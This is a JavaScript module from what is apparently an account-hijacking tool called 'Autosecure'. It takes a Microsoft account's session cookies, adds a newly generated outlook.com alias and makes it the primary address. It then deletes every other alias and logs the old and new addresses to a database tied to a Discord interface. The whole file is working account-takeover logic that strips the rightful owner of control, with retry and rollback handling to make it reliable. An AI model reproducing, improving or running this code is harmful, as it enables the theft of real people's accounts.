const makePrimary = require("../secure/makePrimary");
const addAlias = require("../secure/addAlias");
const removeAlias = require("../secure/removeAlias");
const getAliases = require("../secure/getAliases");
const { updateStatus, updateExtraInformation } = require("../process/helpers");
const {
  normalizeEmail,
  isSameEmail,
  sanitizeAliasPrefix,
  generateCorrelationId,
  logAliasEvent,
  ALIAS_STATES
} = require("../secure/aliasHelper");
const generate = require("../generate");
const config = require("../../../config.json");

/**
 * Enforces Microsoft Live ID naming rules on top of base sanitization:
 * - Must NOT start with a digit (0-9), hyphen (-), or underscore (_)
 * - Must NOT contain consecutive dots (..)
 * - Result must be at least 3 characters long
 * Falls back to "hachiiromc" if sanitized prefix is invalid.
 */
function strictSanitizePrefix(rawPrefix) {
  let clean = sanitizeAliasPrefix(rawPrefix);
  if (!clean) return "";

  // Strip consecutive dots
  clean = clean.replace(/\.{2,}/g, ".");

  // Strip leading characters that are digits, hyphens, or underscores
  clean = clean.replace(/^[0-9\-_]+/, "");

  // Strip leading/trailing dots (sanitizeAliasPrefix already does this, but be safe)
  clean = clean.replace(/^\.+|\.+$/g, "");

  return clean;
}

/**
 * Determines whether changeprimary is explicitly disabled.
 * DB stores: 0 (off), 1 (on), 2 (on-variant).
 * Settings may arrive as integer, string, boolean, null, or undefined.
 *
 * Returns true when changeprimary should be ACTIVE (default = active when undefined).
 */
function isChangePrimaryEnabled(settings) {
  const val = settings?.changeprimary;

  // undefined/null → default to enabled
  if (val === undefined || val === null) return true;

  // Explicit disabled values
  if (val === false) return false;
  if (val === 0 || val === "0") return false;
  if (typeof val === "string" && val.toLowerCase() === "false") return false;

  // Everything else (1, 2, "1", "2", "true", true) → enabled
  return true;
}

/**
 * Orchestrates alias mutations during Autosecure.
 * Powered by strict 4-phase state machine:
 * BEFORE -> VALIDATION -> CHANGE PRIMARY -> AFTER -> REMOVE SECONDARY.
 */
module.exports = async function aliasses(
  axios,
  canary2,
  uid,
  acc,
  aliases,
  primary,
  settings,
  apicanary,
  cookiedata,
  amsc
) {
  const rootReqId = generateCorrelationId();
  const amrp = cookiedata?.cookies?.amrp;

  if (amrp && typeof axios.setCookie === "function") {
    axios.setCookie(`AMRPSSecAuth=${amrp}`);
  }
  if (amsc && typeof axios.setCookie === "function") {
    axios.setCookie(`amsc=${amsc}`);
  }

  // 1. Initial State Read
  const initial = await getAliases(axios);
  const initialPrimary = normalizeEmail(initial?.primary || primary || acc.email || "");
  const initialAliases = new Set((initial?.aliases || []).map(normalizeEmail));
  if (initialPrimary) initialAliases.add(initialPrimary);

  const shouldChangePrimary = isChangePrimaryEnabled(settings);

  if (shouldChangePrimary) {
    const rawPrefix = settings?.prefix || config.prefix || "hachiiromc";
    const prefix = strictSanitizePrefix(rawPrefix) || "hachiiromc";
    const newAliasName = `${prefix}${generate(8).toLowerCase()}`;
    const expectedNewEmail = `${newAliasName}@outlook.com`.toLowerCase();

    logAliasEvent("ALIAS_WORKFLOW", {
      requestId: rootReqId,
      step: "ADD_ALIAS",
      status: "STARTED",
      targetAlias: expectedNewEmail
    });

    const addResult = await addAlias(axios, newAliasName, initial?.formCanary || canary2, rootReqId);
    if (!addResult) {
      logAliasEvent("ALIAS_WORKFLOW", {
        requestId: rootReqId,
        step: "ADD_ALIAS",
        status: "FAILED",
        message: `Failed to add alias ${expectedNewEmail}. Retaining ${initialPrimary}`
      });
      acc.email = initialPrimary;
      await updateStatus(uid, "email", acc.email);
      return acc;
    }

    const verifiedNewEmail = typeof addResult === "string" ? addResult.toLowerCase() : expectedNewEmail;

    // 2. Make Primary & Verify on Server
    // addAlias rotates server canary tokens, so refetch authoritative state
    // to obtain the fresh post-rotation canary for makePrimary.
    let freshCanaryForPrimary = initial?.apiCanary || apicanary;
    try {
      const postAddState = await getAliases(axios);
      if (postAddState?.apiCanary) freshCanaryForPrimary = postAddState.apiCanary;
      else if (postAddState?.canary) freshCanaryForPrimary = postAddState.canary;
    } catch (_) {
      logAliasEvent("ALIAS_WORKFLOW", {
        requestId: rootReqId,
        step: "CANARY_REFRESH",
        status: "WARN",
        message: "Failed to refresh canary after addAlias; using pre-rotation canary as fallback"
      });
    }

    logAliasEvent("ALIAS_WORKFLOW", {
      requestId: rootReqId,
      step: "MAKE_PRIMARY",
      status: "STARTED",
      targetAlias: verifiedNewEmail
    });

    const isPrimarySuccess = await makePrimary(
      axios,
      verifiedNewEmail,
      freshCanaryForPrimary,
      2,
      rootReqId,
      false,
      uid
    );

    if (isPrimarySuccess) {
      acc.email = verifiedNewEmail;
      await updateStatus(uid, "email", acc.email);
      await updateExtraInformation(uid, "primary", acc.email);

      // 3. Remove Old Secondary Aliases (Safe Verified Sweep)
      logAliasEvent("ALIAS_WORKFLOW", {
        requestId: rootReqId,
        step: "REMOVE_SECONDARY",
        status: "STARTED",
        message: `Removing old secondary aliases now that ${verifiedNewEmail} is verified primary`
      });

      const sweepAliases = await getAliases(axios);
      const candidates = new Set([...initialAliases, ...(sweepAliases?.aliases || []).map(normalizeEmail)]);
      const toRemove = Array.from(candidates).filter((a) => a && !isSameEmail(a, verifiedNewEmail));

      // Persist old aliases list to DB for Discord oldaliases button
      if (toRemove.length > 0) {
        try {
          await updateExtraInformation(uid, "oldaliases", JSON.stringify(toRemove));
        } catch (dbErr) {
          logAliasEvent("ALIAS_WORKFLOW", {
            requestId: rootReqId,
            step: "REMOVE_SECONDARY",
            status: "WARN",
            message: `Failed to persist oldaliases to DB: ${dbErr.message}`
          });
        }
      }

      for (const oldAlias of toRemove) {
        try {
          // Refetch fresh canary before each removal to avoid stale canary rotation
          const freshState = await getAliases(axios);
          const freshFormCanary = freshState?.formCanary || null;

          await removeAlias(axios, oldAlias, freshFormCanary, amrp, amsc, rootReqId);
        } catch (remErr) {
          logAliasEvent("ALIAS_WORKFLOW", {
            requestId: rootReqId,
            step: "REMOVE_SECONDARY",
            status: "WARN",
            message: `Could not remove secondary alias ${oldAlias}: ${remErr.message}`
          });
        }
      }

      const finalState = await getAliases(axios);
      const remainingAliases = finalState?.aliases || [verifiedNewEmail];
      await updateExtraInformation(uid, "aliases", JSON.stringify(remainingAliases));
      await updateExtraInformation(uid, "newaliases", JSON.stringify([verifiedNewEmail]));
    } else {
      // makePrimary reported failure. Before rolling back, re-verify the
      // authoritative server state: the mutation may have actually succeeded
      // while only the verification step failed (e.g. transient network error).
      let actualPrimary = null;
      try {
        const recheck = await getAliases(axios);
        actualPrimary = normalizeEmail(recheck?.primary);
      } catch (_) {}

      if (actualPrimary && isSameEmail(actualPrimary, verifiedNewEmail)) {
        // Server did change primary — accept the authoritative truth instead of
        // rolling back and reporting a stale email.
        acc.email = verifiedNewEmail;
        await updateStatus(uid, "email", acc.email);
        await updateExtraInformation(uid, "primary", acc.email);

        logAliasEvent("ALIAS_WORKFLOW", {
          requestId: rootReqId,
          step: "MAKE_PRIMARY",
          status: "STATE_VERIFIED",
          message: `Re-verified: ${verifiedNewEmail} is authoritative primary despite makePrimary returning false`
        });
      } else {
        // ROLLBACK: makePrimary truly failed — remove the alias we just added to avoid quota leak
        logAliasEvent("ALIAS_WORKFLOW", {
          requestId: rootReqId,
          step: "MAKE_PRIMARY",
          status: "FAILED",
          message: `MakePrimary failed; rolling back alias ${verifiedNewEmail}`
        });

        try {
          const rollbackState = await getAliases(axios);
          const rollbackCanary = rollbackState?.formCanary || null;
          const rollbackResult = await removeAlias(axios, verifiedNewEmail, rollbackCanary, amrp, amsc, rootReqId);

          logAliasEvent("ALIAS_WORKFLOW", {
            requestId: rootReqId,
            step: "ROLLBACK_ALIAS",
            status: rollbackResult ? "SUCCESS" : "FAILED",
            message: rollbackResult
              ? `Rolled back alias ${verifiedNewEmail} successfully`
              : `Failed to rollback alias ${verifiedNewEmail} — manual cleanup may be required`
          });
        } catch (rollbackErr) {
          logAliasEvent("ALIAS_WORKFLOW", {
            requestId: rootReqId,
            step: "ROLLBACK_ALIAS",
            status: "FAILED",
            message: `Rollback error for ${verifiedNewEmail}: ${rollbackErr.message}`
          });
        }

        acc.email = initialPrimary;
        await updateStatus(uid, "email", acc.email);
      }
    }
  } else {
    // changeprimary is disabled — read and persist the current authoritative primary
    logAliasEvent("ALIAS_WORKFLOW", {
      requestId: rootReqId,
      step: "SKIP_CHANGE",
      status: "INFO",
      message: `changeprimary is disabled (value=${settings?.changeprimary}): retaining existing primary`
    });
    const authoritative = await getAliases(axios);
    acc.email = normalizeEmail(authoritative?.primary || primary || acc.email);
    await updateStatus(uid, "email", acc.email);
  }

  return acc;
};
